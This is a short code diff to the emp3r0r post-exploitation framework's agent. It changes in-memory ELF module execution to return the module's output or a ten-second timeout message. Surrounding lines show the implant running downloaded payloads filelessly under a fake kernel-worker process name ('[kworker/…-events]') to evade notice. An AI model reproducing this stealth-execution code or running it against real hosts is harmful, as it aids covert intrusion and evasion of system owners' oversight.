@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/jm33-m0/arc"
 	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
@@ -85,16 +86,24 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 		}
 	case "elf":
 		if inMem {
+			outChan := make(chan string)
 			go func() {
 				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
 				// if you need to pass arguments to the in-memory module, you can do it in environment variables
 				// when implementing the module, you can read the arguments from env
-				err = exe_utils.InMemExeRun(payload_data, []string{randName}, env)
+				out, err = exe_utils.InMemExeRun(payload_data, []string{randName}, env)
 				if err != nil {
-					log.Printf("InMemExeRun: %v", err)
+					out = fmt.Sprintf("InMemExeRun: %v", err)
 				}
+				outChan <- fmt.Sprintf("Success\n%s", out)
 			}()
-			return "ELF started in memory"
+			select {
+			case out = <-outChan:
+				return out
+			case <-time.After(10 * time.Second):
+				out = "Timeout while waiting for in-memory module to print output"
+				return out
+			}
 		}
 	default:
 		// on disk modules
